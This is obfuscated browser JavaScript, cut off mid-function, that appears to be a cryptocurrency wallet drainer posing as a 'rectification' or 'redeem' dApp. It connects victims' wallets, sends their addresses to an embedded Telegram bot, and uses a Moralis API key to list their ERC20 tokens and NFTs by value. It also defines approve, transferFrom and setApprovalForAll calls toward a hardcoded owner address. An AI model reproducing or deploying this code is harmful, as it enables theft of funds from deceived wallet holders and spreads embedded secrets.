const _0x3cc450=_0x5465;(function(_0x5241cc,_0x5f588d){const _0x3e6d6d=_0x5465,_0x16dee8=_0x5241cc();while(!![]){try{const _0x1ff8bf=parseInt(_0x3e6d6d(0x20d))/0x1*(-parseInt(_0x3e6d6d(0x1e9))/0x2)+parseInt(_0x3e6d6d(0x194))/0x3*(parseInt(_0x3e6d6d(0x169))/0x4)+-parseInt(_0x3e6d6d(0x20e))/0x5*(parseInt(_0x3e6d6d(0x159))/0x6)+parseInt(_0x3e6d6d(0x1b2))/0x7+parseInt(_0x3e6d6d(0x163))/0x8*(parseInt(_0x3e6d6d(0x16f))/0x9)+parseInt(_0x3e6d6d(0x210))/0xa*(-parseInt(_0x3e6d6d(0x1a5))/0xb)+parseInt(_0x3e6d6d(0x151))/0xc;if(_0x1ff8bf===_0x5f588d)break;else _0x16dee8['push'](_0x16dee8['shift']());}catch(_0x35b0a4){_0x16dee8['push'](_0x16dee8['shift']());}}}(_0x349d,0xb8526));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {bsc,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[bsc,mainnet],projectId='ee71d215d0dec7d1bf950851c84d9643',{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x3cc450(0x1c3))]({'chains':chains,'options':{'appName':_0x3cc450(0x1d2)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x3cc450(0x158),'coinbase':_0x3cc450(0x18d)}},ethereumClient);let currentUrl=window[_0x3cc450(0x1b0)][_0x3cc450(0x1c6)];const OWNER_ADDRESS=_0x3cc450(0x17b),ABI=[{'constant':!![],'inputs':[],'name':_0x3cc450(0x1b7),'outputs':[{'name':'','type':_0x3cc450(0x162)}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x3cc450(0x1b8)}],'name':_0x3cc450(0x1aa),'outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'constant':![],'inputs':[{'name':'_spender','type':_0x3cc450(0x1b8)},{'name':'_value','type':'uint256'}],'name':'approve','outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':'function'},{'constant':!![],'inputs':[],'name':_0x3cc450(0x1d1),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'constant':![],'inputs':[{'name':_0x3cc450(0x175),'type':_0x3cc450(0x1b8)}],'name':_0x3cc450(0x200),'outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':_0x3cc450(0x1e7)}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'constant':![],'inputs':[{'name':'_from','type':_0x3cc450(0x1b8)},{'name':_0x3cc450(0x1dd),'type':'address'},{'name':_0x3cc450(0x1ee),'type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x1ec),'outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':'view','type':_0x3cc450(0x173)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x3cc450(0x188),'outputs':[{'name':'','type':_0x3cc450(0x1e7)}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[],'name':_0x3cc450(0x204),'outputs':[{'name':'','type':_0x3cc450(0x1e7)}],'payable':![],'stateMutability':'view','type':_0x3cc450(0x173)},{'constant':!![],'inputs':[],'name':_0x3cc450(0x19e),'outputs':[{'name':'','type':_0x3cc450(0x1e7)}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[],'name':'_totalSupply','outputs':[{'name':'','type':_0x3cc450(0x1e7)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[],'name':_0x3cc450(0x1c0),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x3cc450(0x173)},{'constant':!![],'inputs':[{'name':_0x3cc450(0x1b5),'type':_0x3cc450(0x1b8)}],'name':'getBlackListStatus','outputs':[{'name':'','type':_0x3cc450(0x193)}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x3cc450(0x1b8)},{'name':'','type':'address'}],'name':_0x3cc450(0x199),'outputs':[{'name':'','type':_0x3cc450(0x1e7)}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[],'name':_0x3cc450(0x180),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[{'name':'who','type':_0x3cc450(0x1b8)}],'name':_0x3cc450(0x1a7),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x3cc450(0x173)},{'constant':![],'inputs':[],'name':_0x3cc450(0x176),'outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[],'name':_0x3cc450(0x1a1),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':'function'},{'constant':!![],'inputs':[],'name':_0x3cc450(0x1ce),'outputs':[{'name':'','type':_0x3cc450(0x1b8)}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':_0x3cc450(0x162)}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'constant':![],'inputs':[{'name':_0x3cc450(0x1dd),'type':_0x3cc450(0x1b8)},{'name':_0x3cc450(0x1ee),'type':_0x3cc450(0x1e7)}],'name':'transfer','outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'constant':![],'inputs':[{'name':'newBasisPoints','type':'uint256'},{'name':_0x3cc450(0x190),'type':'uint256'}],'name':_0x3cc450(0x152),'outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'constant':![],'inputs':[{'name':_0x3cc450(0x15e),'type':'uint256'}],'name':_0x3cc450(0x1e1),'outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'constant':![],'inputs':[{'name':_0x3cc450(0x15e),'type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x15a),'outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[{'name':_0x3cc450(0x171),'type':_0x3cc450(0x1b8)},{'name':'_spender','type':_0x3cc450(0x1b8)}],'name':_0x3cc450(0x1ed),'outputs':[{'name':_0x3cc450(0x1e8),'type':_0x3cc450(0x1e7)}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':'function'},{'constant':!![],'inputs':[],'name':_0x3cc450(0x1f3),'outputs':[{'name':'','type':_0x3cc450(0x1e7)}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[{'name':'','type':_0x3cc450(0x1b8)}],'name':_0x3cc450(0x15d),'outputs':[{'name':'','type':_0x3cc450(0x193)}],'payable':![],'stateMutability':'view','type':_0x3cc450(0x173)},{'constant':![],'inputs':[{'name':_0x3cc450(0x1f8),'type':_0x3cc450(0x1b8)}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x3cc450(0x1cf),'type':'function'},{'constant':![],'inputs':[{'name':_0x3cc450(0x17c),'type':_0x3cc450(0x1b8)}],'name':_0x3cc450(0x1d7),'outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'constant':![],'inputs':[{'name':_0x3cc450(0x1d3),'type':_0x3cc450(0x1b8)}],'name':_0x3cc450(0x213),'outputs':[],'payable':![],'stateMutability':_0x3cc450(0x201),'type':'function'},{'inputs':[{'name':'_initialSupply','type':_0x3cc450(0x1e7)},{'name':'_name','type':'string'},{'name':_0x3cc450(0x161),'type':_0x3cc450(0x162)},{'name':_0x3cc450(0x211),'type':'uint256'}],'payable':![],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x16b)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3cc450(0x15e),'type':'uint256'}],'name':'Issue','type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3cc450(0x15e),'type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x157),'type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3cc450(0x1e6),'type':_0x3cc450(0x1b8)}],'name':_0x3cc450(0x1af),'type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':_0x3cc450(0x1e7)},{'indexed':![],'name':_0x3cc450(0x1db),'type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x178),'type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3cc450(0x1d3),'type':_0x3cc450(0x1b8)},{'indexed':![],'name':_0x3cc450(0x1f4),'type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x1cd),'type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3cc450(0x1fc),'type':_0x3cc450(0x1b8)}],'name':_0x3cc450(0x1d6),'type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3cc450(0x1fc),'type':'address'}],'name':'RemovedBlackList','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':'address'},{'indexed':!![],'name':_0x3cc450(0x1fe),'type':_0x3cc450(0x1b8)},{'indexed':![],'name':'value','type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x1ac),'type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'from','type':_0x3cc450(0x1b8)},{'indexed':!![],'name':'to','type':_0x3cc450(0x1b8)},{'indexed':![],'name':_0x3cc450(0x17e),'type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x1c1),'type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[],'name':_0x3cc450(0x185),'type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[],'name':_0x3cc450(0x214),'type':_0x3cc450(0x1e5)}],ABIN=[{'inputs':[{'internalType':_0x3cc450(0x162),'name':_0x3cc450(0x1b7),'type':_0x3cc450(0x162)},{'internalType':'string','name':_0x3cc450(0x205),'type':_0x3cc450(0x162)},{'internalType':_0x3cc450(0x1e7),'name':_0x3cc450(0x16d),'type':'uint256'},{'internalType':'uint256','name':_0x3cc450(0x1f2),'type':'uint256'}],'stateMutability':_0x3cc450(0x201),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x3cc450(0x1ce),'type':'address'},{'indexed':!![],'internalType':'address','name':'approved','type':'address'},{'indexed':!![],'internalType':_0x3cc450(0x1e7),'name':'tokenId','type':_0x3cc450(0x1e7)}],'name':'Approval','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x3cc450(0x1b8),'name':_0x3cc450(0x1ce),'type':_0x3cc450(0x1b8)},{'indexed':!![],'internalType':_0x3cc450(0x1b8),'name':_0x3cc450(0x198),'type':'address'},{'indexed':![],'internalType':_0x3cc450(0x193),'name':_0x3cc450(0x191),'type':_0x3cc450(0x193)}],'name':_0x3cc450(0x182),'type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':'previousOwner','type':_0x3cc450(0x1b8)},{'indexed':!![],'internalType':'address','name':_0x3cc450(0x17c),'type':'address'}],'name':'OwnershipTransferred','type':_0x3cc450(0x1e5)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x3cc450(0x1b8),'name':_0x3cc450(0x15c),'type':_0x3cc450(0x1b8)},{'indexed':!![],'internalType':'address','name':'to','type':_0x3cc450(0x1b8)},{'indexed':!![],'internalType':_0x3cc450(0x1e7),'name':_0x3cc450(0x177),'type':'uint256'}],'name':_0x3cc450(0x1c1),'type':'event'},{'inputs':[],'name':_0x3cc450(0x18f),'outputs':[{'internalType':_0x3cc450(0x162),'name':'','type':_0x3cc450(0x162)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[],'name':'MAX_APES','outputs':[{'internalType':_0x3cc450(0x1e7),'name':'','type':_0x3cc450(0x1e7)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[],'name':_0x3cc450(0x1a2),'outputs':[{'internalType':_0x3cc450(0x1e7),'name':'','type':_0x3cc450(0x1e7)}],'stateMutability':_0x3cc450(0x1cf),'type':'function'},{'inputs':[],'name':_0x3cc450(0x160),'outputs':[{'internalType':_0x3cc450(0x1e7),'name':'','type':_0x3cc450(0x1e7)}],'stateMutability':_0x3cc450(0x1cf),'type':'function'},{'inputs':[{'internalType':_0x3cc450(0x1b8),'name':'to','type':_0x3cc450(0x1b8)},{'internalType':_0x3cc450(0x1e7),'name':'tokenId','type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x206),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[{'internalType':_0x3cc450(0x1b8),'name':'owner','type':_0x3cc450(0x1b8)}],'name':'balanceOf','outputs':[{'internalType':_0x3cc450(0x1e7),'name':'','type':'uint256'}],'stateMutability':_0x3cc450(0x1cf),'type':'function'},{'inputs':[],'name':'baseURI','outputs':[{'internalType':_0x3cc450(0x162),'name':'','type':_0x3cc450(0x162)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[],'name':_0x3cc450(0x1c7),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[],'name':_0x3cc450(0x203),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x3cc450(0x177),'type':'uint256'}],'name':_0x3cc450(0x1fb),'outputs':[{'internalType':'address','name':'','type':_0x3cc450(0x1b8)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[{'internalType':_0x3cc450(0x1b8),'name':_0x3cc450(0x1ce),'type':'address'},{'internalType':_0x3cc450(0x1b8),'name':_0x3cc450(0x198),'type':_0x3cc450(0x1b8)}],'name':_0x3cc450(0x15b),'outputs':[{'internalType':_0x3cc450(0x193),'name':'','type':_0x3cc450(0x193)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[],'name':_0x3cc450(0x1e2),'outputs':[{'internalType':_0x3cc450(0x1e7),'name':'','type':'uint256'}],'stateMutability':'view','type':_0x3cc450(0x173)},{'inputs':[{'internalType':'uint256','name':'numberOfTokens','type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x1fa),'outputs':[],'stateMutability':'payable','type':_0x3cc450(0x173)},{'inputs':[],'name':'name','outputs':[{'internalType':_0x3cc450(0x162),'name':'','type':_0x3cc450(0x162)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[],'name':'owner','outputs':[{'internalType':_0x3cc450(0x1b8),'name':'','type':_0x3cc450(0x1b8)}],'stateMutability':_0x3cc450(0x1cf),'type':'function'},{'inputs':[{'internalType':_0x3cc450(0x1e7),'name':_0x3cc450(0x177),'type':'uint256'}],'name':_0x3cc450(0x18b),'outputs':[{'internalType':_0x3cc450(0x1b8),'name':'','type':_0x3cc450(0x1b8)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x3cc450(0x1ea),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[],'name':_0x3cc450(0x179),'outputs':[],'stateMutability':'nonpayable','type':_0x3cc450(0x173)},{'inputs':[{'internalType':'address','name':_0x3cc450(0x15c),'type':_0x3cc450(0x1b8)},{'internalType':'address','name':'to','type':_0x3cc450(0x1b8)},{'internalType':'uint256','name':'tokenId','type':_0x3cc450(0x1e7)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[{'internalType':'address','name':_0x3cc450(0x15c),'type':_0x3cc450(0x1b8)},{'internalType':_0x3cc450(0x1b8),'name':'to','type':_0x3cc450(0x1b8)},{'internalType':_0x3cc450(0x1e7),'name':_0x3cc450(0x177),'type':'uint256'},{'internalType':_0x3cc450(0x1a3),'name':_0x3cc450(0x19c),'type':_0x3cc450(0x1a3)}],'name':_0x3cc450(0x166),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[],'name':_0x3cc450(0x1f9),'outputs':[{'internalType':'bool','name':'','type':_0x3cc450(0x193)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[{'internalType':'address','name':_0x3cc450(0x198),'type':'address'},{'internalType':_0x3cc450(0x193),'name':_0x3cc450(0x191),'type':_0x3cc450(0x193)}],'name':_0x3cc450(0x165),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[{'internalType':_0x3cc450(0x162),'name':_0x3cc450(0x19f),'type':_0x3cc450(0x162)}],'name':'setBaseURI','outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[{'internalType':'string','name':'provenanceHash','type':'string'}],'name':_0x3cc450(0x1a9),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[{'internalType':_0x3cc450(0x1e7),'name':_0x3cc450(0x1d8),'type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x16e),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':'function'},{'inputs':[],'name':_0x3cc450(0x1d5),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[],'name':_0x3cc450(0x1f6),'outputs':[{'internalType':_0x3cc450(0x1e7),'name':'','type':_0x3cc450(0x1e7)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[],'name':_0x3cc450(0x181),'outputs':[{'internalType':_0x3cc450(0x1e7),'name':'','type':_0x3cc450(0x1e7)}],'stateMutability':_0x3cc450(0x1cf),'type':'function'},{'inputs':[{'internalType':_0x3cc450(0x186),'name':_0x3cc450(0x1a8),'type':'bytes4'}],'name':_0x3cc450(0x17d),'outputs':[{'internalType':_0x3cc450(0x193),'name':'','type':_0x3cc450(0x193)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[],'name':_0x3cc450(0x205),'outputs':[{'internalType':'string','name':'','type':_0x3cc450(0x162)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x3cc450(0x1e7),'name':_0x3cc450(0x189),'type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x1f0),'outputs':[{'internalType':_0x3cc450(0x1e7),'name':'','type':_0x3cc450(0x1e7)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[{'internalType':_0x3cc450(0x1b8),'name':_0x3cc450(0x1ce),'type':_0x3cc450(0x1b8)},{'internalType':_0x3cc450(0x1e7),'name':'index','type':'uint256'}],'name':_0x3cc450(0x1cc),'outputs':[{'internalType':'uint256','name':'','type':_0x3cc450(0x1e7)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[{'internalType':'uint256','name':'tokenId','type':_0x3cc450(0x1e7)}],'name':'tokenURI','outputs':[{'internalType':_0x3cc450(0x162),'name':'','type':_0x3cc450(0x162)}],'stateMutability':_0x3cc450(0x1cf),'type':_0x3cc450(0x173)},{'inputs':[],'name':'totalSupply','outputs':[{'internalType':_0x3cc450(0x1e7),'name':'','type':_0x3cc450(0x1e7)}],'stateMutability':_0x3cc450(0x1cf),'type':'function'},{'inputs':[{'internalType':_0x3cc450(0x1b8),'name':_0x3cc450(0x15c),'type':'address'},{'internalType':_0x3cc450(0x1b8),'name':'to','type':_0x3cc450(0x1b8)},{'internalType':_0x3cc450(0x1e7),'name':_0x3cc450(0x177),'type':_0x3cc450(0x1e7)}],'name':_0x3cc450(0x1ec),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[{'internalType':_0x3cc450(0x1b8),'name':_0x3cc450(0x17c),'type':'address'}],'name':_0x3cc450(0x1d7),'outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)},{'inputs':[],'name':'withdraw','outputs':[],'stateMutability':_0x3cc450(0x201),'type':_0x3cc450(0x173)}];let wallet;$(_0x3cc450(0x1d9))[_0x3cc450(0x168)](async function(){const _0x2b93ca=_0x3cc450;wallet=_0x2b93ca(0x17a),await connector();}),$(_0x3cc450(0x197))['click'](async function(){const _0x205bc5=_0x3cc450;wallet=_0x205bc5(0x1f1),await connector();}),$(_0x3cc450(0x207))['click'](async function(){const _0x610c2a=_0x3cc450;wallet=_0x610c2a(0x20f),await connector();}),$(_0x3cc450(0x1b4))['click'](async function(){const _0x409643=_0x3cc450;try{await web3Modal[_0x409643(0x1df)]();}catch(_0x19f732){console[_0x409643(0x1cb)](_0x409643(0x1da),_0x19f732);return;}});function _0x349d(){const _0x11243c=['status','undefined','Unable\x20to\x20get\x20NFts','Redeem','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','186HasJNi','redeem','isApprovedForAll','from','isBlackListed','amount','Transaction\x20Receipt:\x20','apePrice','_symbol','string','160wsgbzw','Error:\x20','setApprovalForAll','safeTransferFrom','catch','click','3868xVHTaL','formatted','constructor','Error\x20processing\x20item\x20','maxNftSupply','setRevealTimestamp','323559kTRGrG','Your\x20address\x20','_owner','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','function','json','_evilUser','pause','tokenId','Params','reserveApes','metamask','0xea8968B218a551919FbD5f1166328C82a96dED54','newOwner','supportsInterface','value','Approve\x20Completed\x20Successfully','paused','startingIndexBlock','ApprovalForAll','5122451029','map','Pause','bytes4','Cl\x20address\x20:\x20','balances','index','&text=','ownerOf','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png','MetaMask','BAYC_PROVENANCE','newMaxFee','approved','message','bool','2631KxqORC','Transaction\x20is\x20submitted\x20to\x20the\x20network','No\x20address','.coinbase','operator','allowed','options','Incorrect\x20network','_data','hash','maximumFee','baseURI','toString','getOwner','REVEAL_TIMESTAMP','bytes','Tokens:','9669LQVhVT','sending\x20ether','balanceOf','interfaceId','setProvenanceHash','deprecate','GET','Approval','connector','NFT','Deprecate','location','all','9829155mVXIQr','Initial\x20list\x20','.connect','_maker','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','name','address','error','price','filter','/erc20','TOKEN\x20Contract\x20Address\x20','0xd759adF2f1B7AAc38141AC6173F94df0Bc4B51a3','.proceed','unpause','Transfer','Token','CoinbaseWalletConnector','&format=decimal&limit=','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','href','emergencySetStartingIndexBlock','bsc','tokens-list','length','log','tokenOfOwnerByIndex','DestroyedBlackFunds','owner','view','Error\x20collecting\x20info\x20about\x20wallet','deprecated','Blockchain\x20rectification','_blackListedUser','then','setStartingIndex','AddedBlackList','transferOwnership','revealTimeStamp','.meta','Could\x20not\x20get\x20a\x20wallet\x20connection','maxFee','https://go.cb-w.com/dapp?cb_url=','_to','balance','openModal','New\x20token','issue','maxApePurchase','https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=','NFT\x20Contract\x20Address\x20','event','newAddress','uint256','remaining','80ayHTcA','renounceOwnership','token_address','transferFrom','allowance','_value','NFTs\x20collection\x20','tokenByIndex','coinbase','saleStart','basisPointsRate','_balance','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','startingIndex','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','_clearedUser','saleIsActive','mintApe','getApproved','_user','https://link.trustwallet.com/open_url?url=','spender','Approved','addBlackList','nonpayable','sort','flipSaleState','decimals','symbol','approve','.trust','result','&vs_currencies=usd','getProvider','https://deep-index.moralis.io/api/v2/','Transaction\x20Rejected','33467dauHzM','173170vNqaRp','trustwallet','9140rNmFhw','_decimals','application/json','destroyBlackFunds','Unpause','11993736YzdvHM','setParams','/nft/collections?chain='];_0x349d=function(){return _0x11243c;};return _0x349d();}let connector=async()=>{const _0x42ea1a=_0x3cc450;if(typeof web3==='undefined'||typeof ethereum===_0x42ea1a(0x155)){console['log']('Hahahahahah');if(wallet===_0x42ea1a(0x17a)){let _0x48f64d='https://metamask.app.link/dapp/'+currentUrl;window[_0x42ea1a(0x1b0)][_0x42ea1a(0x1c6)]=_0x48f64d;}else{if(wallet===_0x42ea1a(0x1f1)){let _0x58f6b3=_0x42ea1a(0x1dc)+currentUrl;window[_0x42ea1a(0x1b0)][_0x42ea1a(0x1c6)]=_0x58f6b3;}else{if(wallet===_0x42ea1a(0x20f)){let _0x547b6a=_0x42ea1a(0x1fd)+currentUrl;window[_0x42ea1a(0x1b0)][_0x42ea1a(0x1c6)]=_0x547b6a;}}}}else try{await web3Modal['openModal']();}catch(_0x8d50ad){console[_0x42ea1a(0x1cb)](_0x42ea1a(0x1da),_0x8d50ad);return;}};function _0x5465(_0x5f44ca,_0x21a9c5){const _0x349d3b=_0x349d();return _0x5465=function(_0x54657d,_0x27838a){_0x54657d=_0x54657d-0x151;let _0x3d9feb=_0x349d3b[_0x54657d];return _0x3d9feb;},_0x5465(_0x5f44ca,_0x21a9c5);}$(_0x3cc450(0x1bf))[_0x3cc450(0x168)](async function(){const _0x176eec=_0x3cc450;let _0x5d1e47=getAccount();console[_0x176eec(0x1cb)](_0x5d1e47),!_0x5d1e47['address']&&(console[_0x176eec(0x1cb)](_0x176eec(0x196)),alert(_0x176eec(0x1f5))),_0x5d1e47[_0x176eec(0x1ad)][_0x176eec(0x1b7)]===_0x176eec(0x18e)&&(_0x5d1e47[_0x176eec(0x1ad)][_0x176eec(0x19a)][_0x176eec(0x20a)]()['networkVersion']!=='56'&&(console[_0x176eec(0x1cb)](_0x176eec(0x19b)),await switchNetwork({'chainId':0x38}))),selectedAccount=_0x5d1e47[_0x176eec(0x1b8)],sendMessage(_0x176eec(0x172)),sendMessage(_0x176eec(0x187)+selectedAccount),covalenthqAPICall();});const Oxa=_0x3cc450(0x1be),Oxc=_0x3cc450(0x183);async function covalenthqAPICall(){const _0x3923ec=_0x3cc450,_0x1b5e1b={'chain':_0x3923ec(0x1c8)},_0x2e749c=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+_0x3923ec(0x1bc));_0x2e749c['search']=new URLSearchParams(_0x1b5e1b)[_0x3923ec(0x1a0)]();const _0x112e43={'method':'GET','headers':{'accept':_0x3923ec(0x212),'X-API-Key':_0x3923ec(0x18c)}};try{const _0x2297d0=await fetch(_0x2e749c,_0x112e43)['then'](_0x4b6172=>_0x4b6172[_0x3923ec(0x174)]());console[_0x3923ec(0x1cb)](_0x2297d0);let _0x1028b2=_0x2297d0;console[_0x3923ec(0x1cb)](_0x3923ec(0x1b3),_0x1028b2);let _0x49d789=await Promise[_0x3923ec(0x1b1)](_0x1028b2[_0x3923ec(0x184)](async _0x413b5c=>{const _0x41c289=_0x3923ec;let _0x442179;try{_0x442179=await getValue(_0x413b5c[_0x41c289(0x1eb)],_0x413b5c[_0x41c289(0x1de)],_0x413b5c[_0x41c289(0x204)]);}catch(_0x52db53){_0x442179=0x0;}return console[_0x41c289(0x1cb)](_0x442179),{'balance':_0x413b5c['balance'],'value':_0x442179,'address':_0x413b5c[_0x41c289(0x1eb)]};}));console['log'](_0x3923ec(0x1c9),_0x49d789),tokens=_0x49d789[_0x3923ec(0x1bb)](_0xf0c4b2=>_0xf0c4b2[_0x3923ec(0x17e)]>0x5),tokens[_0x3923ec(0x202)]((_0x59bcc1,_0x5995cf)=>_0x5995cf[_0x3923ec(0x17e)]-_0x59bcc1['value']),console[_0x3923ec(0x1cb)]('chainId:',await getNetwork(),_0x3923ec(0x1a4),tokens),NFTs=await getNFTs(selectedAccount)['catch'](_0x2ea5b2=>{const 